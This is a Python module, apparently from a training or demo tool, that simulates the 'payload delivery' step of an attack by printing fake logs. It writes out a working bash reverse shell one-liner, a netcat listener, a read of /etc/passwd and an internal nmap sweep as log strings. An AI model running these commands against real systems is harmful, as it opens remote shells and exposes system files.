"""
Payload Delivery Module - Step 3
Simulates reverse shell connection and command execution
"""

import time
import random

class PayloadModule:
    def __init__(self):
        self.name = "Payload Delivery"
        self.description = "Reverse shell connection and command execution"
    
    def execute(self, target_info=None):
        """Execute payload delivery simulation"""
        logs = []
        
        target = target_info.get('target', '127.0.0.1') if target_info else '127.0.0.1'
        
        logs.append("[PAYLOAD] 🚀 Starting payload delivery phase...")
        logs.append(f"[PAYLOAD] 🎯 Target: {target}:4444")
        logs.append("[PAYLOAD] 📡 Setting up reverse shell listener...")
        
        # Simulate reverse shell setup
        logs.append("\n[PAYLOAD] 🔧 Configuring reverse shell...")
        logs.append("[PAYLOAD] Listener: nc -lvp 4444")
        logs.append("[PAYLOAD] Payload: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1")
        logs.append("[PAYLOAD] Executing payload on target...")
        logs.append("[PAYLOAD] Response: Connection established!")
        logs.append("[PAYLOAD] ⚠️  Reverse shell connection successful!")
        
        # Simulate shell interaction
        logs.append("\n[PAYLOAD] 💻 Interactive shell session started...")
        logs.append("[PAYLOAD] ┌─────────────────────────────────────────┐")
        logs.append("[PAYLOAD] │           REVERSE SHELL SESSION         │")
        logs.append("[PAYLOAD] └─────────────────────────────────────────┘")
        
        # Simulate command execution
        commands = [
            ("whoami", "www-data"),
            ("id", "uid=33(www-data) gid=33(www-data) groups=33(www-data)"),
            ("pwd", "/var/www/html"),
            ("ls -la", "total 48\ndrwxr-xr-x 8 www-data www-data 4096 Jan 15 10:30 .\ndrwxr-xr-x 3 root     root     4096 Jan 15 09:00 ..\n-rw-r--r-- 1 www-data www-data 1234 Jan 15 10:25 index.php\n-rw-r--r-- 1 www-data www-data 5678 Jan 15 10:20 config.php\n-rw-r--r-- 1 www-data www-data 9012 Jan 15 10:15 admin.php"),
            ("uname -a", "Linux target-server 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux"),
            ("ps aux | grep apache", "root      1234  0.0  0.1  12345  6789 ?        Ss   10:30   0:00 /usr/sbin/apache2 -k start\nwww-data  1235  0.0  0.0  12345  6789 ?        S    10:30   0:00 /usr/sbin/apache2 -k start"),
            ("netstat -tulpn", "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1234/sshd\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1235/apache2"),
            ("cat /etc/passwd | head -10", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin"),
            ("find / -name '*.txt' -type f 2>/dev/null | head -5", "/var/log/auth.log\n/var/log/syslog\n/home/user/documents/notes.txt\n/tmp/temp_file.txt\n/var/www/html/readme.txt"),
            ("history | tail -10", "   1  ls -la\n   2  cd /var/www/html\n   3  cat config.php\n   4  ps aux\n   5  netstat -tulpn\n   6  whoami\n   7  id\n   8  pwd\n   9  uname -a\n  10  find / -name '*.txt'")
        ]
        
        for cmd, output in commands:
            logs.append(f"[PAYLOAD] $ {cmd}")
            logs.append(f"[PAYLOAD] {output}")
            time.sleep(0.5)  # Simulate command execution time
        
        # Simulate file system exploration
        logs.append("\n[PAYLOAD] 📁 Exploring file system...")
        logs.append("[PAYLOAD] $ cd /home")
        logs.append("[PAYLOAD] $ ls -la")
        logs.append("[PAYLOAD] total 12\ndrwxr-xr-x 3 root root 4096 Jan 15 09:00 .\ndrwxr-xr-x 3 root root 4096 Jan 15 09:00 ..\ndrwxr-xr-x 2 user user 4096 Jan 15 10:00 user")
        logs.append("[PAYLOAD] $ cd user")
        logs.append("[PAYLOAD] $ ls -la")
        logs.append("[PAYLOAD] total 8\ndrwxr-xr-x 2 user user 4096 Jan 15 10:00 .\ndrwxr-xr-x 3 root root 4096 Jan 15 09:00 ..\n-rw-r--r-- 1 user user  123 Jan 15 10:00 secret.txt")
        logs.append("[PAYLOAD] $ cat secret.txt")
        logs.append("[PAYLOAD] This is a secret file containing sensitive information.")
        
        # Simulate network reconnaissance from inside
        logs.append("\n[PAYLOAD] 🌐 Internal network reconnaissance...")
        logs.append("[PAYLOAD] $ ip route")
        logs.append("[PAYLOAD] default via 192.168.1.1 dev eth0\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.100")
        logs.append("[PAYLOAD] $ nmap -sn 192.168.1.0/24")
        logs.append("[PAYLOAD] Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-15 10:35:00")
        logs.append("[PAYLOAD] Nmap scan report for 192.168.1.1 (gateway)")
        logs.append("[PAYLOAD] Host is up (0.001s latency).")
        logs.append("[PAYLOAD] Nmap scan report for 192.168.1.100 (target)")
        logs.append("[PAYLOAD] Host is up (0.000s latency).")
        logs.append("[PAYLOAD] Nmap scan report for 192.168.1.200 (database)")
        logs.append("[PAYLOAD] Host is up (0.002s latency).")
        
        logs.append("\n[PAYLOAD] ✅ Payload delivery phase completed!")
        logs.append("[PAYLOAD] 📊 Summary: Reverse shell established, system compromised")
        logs.append("[PAYLOAD] 🎯 Access level: Full system access via reverse shell")
        logs.append("[PAYLOAD] 🔑 Internal network discovered: 3 hosts found")
        
        return logs
